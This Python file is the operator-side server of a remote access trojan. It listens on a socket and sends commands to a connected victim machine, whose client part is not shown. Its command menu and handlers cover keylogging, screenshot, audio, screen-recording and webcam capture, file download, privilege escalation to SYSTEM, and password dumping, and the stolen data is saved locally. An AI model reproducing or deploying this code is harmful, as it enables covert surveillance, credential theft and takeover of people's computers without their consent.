import socket
import os
import time
import struct
import threading

server_ip = '192.168.56.106'  # Set this to the correct IP address
server_port = 9999

log_directory = "keylogs"
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

screenshot_directory = "screenshots"
if not os.path.exists(screenshot_directory):
    os.makedirs(screenshot_directory)

audio_directory = "audio"
if not os.path.exists(audio_directory):
    os.makedirs(audio_directory)

screenrecord_directory = "screenrecords"
if not os.path.exists(screenrecord_directory):
    os.makedirs(screenrecord_directory)

webcam_directory = "webcams"
if not os.path.exists(webcam_directory):
    os.makedirs(webcam_directory)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((server_ip, server_port))
server.listen(5)

print(f"Listening for connections on {server_ip}:{server_port}...")

received_length = 0
loading = False

def receive_data(sock, length):
    data = b''
    start_time = time.time()
    while len(data) < length:
        try:
            packet = sock.recv(length - len(data))
            if not packet:
                return None
            data += packet
            elapsed_time = time.time() - start_time
            if elapsed_time > 60:  # Extend timeout to 60 seconds for large files
                start_time = time.time()  # Reset timer
        except socket.timeout:
            return None
    return data

def show_loading(total_length):
    global received_length, loading
    while loading:
        print(f"\rDownloading: {received_length}/{total_length} bytes", end="", flush=True)
        time.sleep(0.1)

client_socket, client_address = server.accept()
print(f"Connection from {client_address} has been established.")

# Receive and print system information
length_data = receive_data(client_socket, 4)  # Receive 4 bytes for length
if length_data:
    try:
        length = struct.unpack('!I', length_data)[0]  # Unpack length as an unsigned int
    except ValueError:
        print("Failed to unpack data length.")  # Log unpacking failure
    else:
        system_info = receive_data(client_socket, length)
        if system_info:
            print("System Information:\n", system_info.decode())

def save_keylog(data):
    timestamp = int(time.time())
    log_file = os.path.join(log_directory, f'keylog_{timestamp}.txt')
    with open(log_file, "w") as f:
        f.write(data.decode())
    return log_file

def save_screenshot(data):
    timestamp = int(time.time())
    screenshot_file = os.path.join(screenshot_directory, f'screenshot_{timestamp}.png')
    with open(screenshot_file, "wb") as f:
        f.write(data)
    return screenshot_file

def save_audio(data):
    timestamp = int(time.time())
    audio_file = os.path.join(audio_directory, f'audio_{timestamp}.wav')
    with open(audio_file, "wb") as f:
        f.write(data)
    return audio_file

def save_screenrecord(data):
    timestamp = int(time.time())
    screenrecord_file = os.path.join(screenrecord_directory, f'screenrecord_{timestamp}.mp4')
    with open(screenrecord_file, "wb") as f:
        f.write(data)
    return screenrecord_file

def save_webcam(data):
    timestamp = int(time.time())
    webcam_file = os.path.join(webcam_directory, f'webcam_{timestamp}.png')
    with open(webcam_file, "wb") as f:
        f.write(data)
    return webcam_file

def show_help():
    help_text = """
Available commands:
  capture_screenshot      - Capture a screenshot from the client
  start_audio             - Start audio recording on the client
  stop_audio              - Stop audio recording from the client and save the file
  start_screenrecord      - Start screen recording on the client
  stop_screenrecord       - Stop screen recording from the client and save the file
  webcam                  - Capture an image from the webcam
  start_keylogger         - Start keylogger on the client
  stop_keylogger          - Stop keylogger on the client and save the logs
  view_keylog             - View keylogs from the client
  cd <path>               - Change directory on the client
  download <path>         - Download a file from the client
  clear                   - Clear the server console
  elevate_to_admin        - Elevate privileges from User to Administrator
  elevate_to_system       - Elevate privileges from Administrator to SYSTEM
  systeminfo              - Get system information from the client
  lock                    - Lock the client's workstation
  dump_password           - Dump passwords from the client
  ls                      - List files in the current directory on the client
  pwd                     - Print the current working directory on the client
  whoami                  - Show the current user on the client
  exit                    - Exit the server console
  help                    - Show this help message

NOTE: You can use basic commands of the target OS.
"""
    print(help_text)

while True:
    command = input(f"serverconsole{client_address} > ").strip()
    if command.lower() == 'exit':
        break
    elif command.lower() == 'help':
        show_help()
    else:
        client_socket.settimeout(120)  # Set a longer timeout for recv operations
        client_socket.send(command.encode())
        
        if command == 'dump_password':
            length_data = receive_data(client_socket, 4)  # Receive 4 bytes for length
            if length_data:
                try:
                    total_length = struct.unpack('!I', length_data)[0]  # Unpack length as an unsigned int
                except ValueError:
                    print("Failed to unpack data length.")  # Log unpacking failure
                    continue
                if total_length > 100000000:  # Check if the expected length is too large
                    print("Expected data length is too large, aborting.")
                    continue

                global received_length, loading
                received_length = 0

                loading = True
                loading_thread = threading.Thread(target=show_loading, args=(total_length,))
                loading_thread.start()

                result_data = b''
                while len(result_data) < total_length:
                    chunk = client_socket.recv(min(total_length - len(result_data), 4096))
                    if not chunk:
                        break
                    result_data += chunk
                    received_length = len(result_data)

                loading = False
                loading_thread.join()

                print(f"\rReceived passwords ({len(result_data)}/{total_length} bytes):\n", result_data.decode())
        else:
            length_data = receive_data(client_socket, 4)  # Receive 4 bytes for length
            if length_data:
                try:
                    length = struct.unpack('!I', length_data)[0]  # Unpack length as an unsigned int
                except ValueError:
                    print("Failed to unpack data length.")  # Log unpacking failure
                    continue

                data = receive_data(client_socket, length)
                if data:
                    if command == 'capture_screenshot':
                        screenshot_file = save_screenshot(data)
                        print(f"Screenshot captured and saved as {screenshot_file}")
                    elif command == 'webcam':
                        webcam_file = save_webcam(data)
                        print(f"Webcam image captured and saved as {webcam_file}")
                    elif command == 'stop_audio':
                        audio_file = save_audio(data)
                        print(f"Audio recorded and saved as {audio_file}")
                    elif command == 'stop_screenrecord':
                        screenrecord_file = save_screenrecord(data)
                        print(f"Screen recording captured and saved as {screenrecord_file}")
                    elif command == 'stop_keylogger':
                        log_file = save_keylog(data)
                        print(f"Keylogger stopped and logs saved as {log_file}")
                    elif command.startswith('download'):
                        path = command.split(' ', 1)[1]
                        file_data = data
                        file_name = os.path.basename(path)
                        with open(file_name, 'wb') as f:
                            f.write(file_data)
                        print(f"File downloaded and saved as {file_name}")
                    else:
                        print(data.decode())
        client_socket.settimeout(None)  # Disable the timeout after operation

client_socket.close()
server.close()
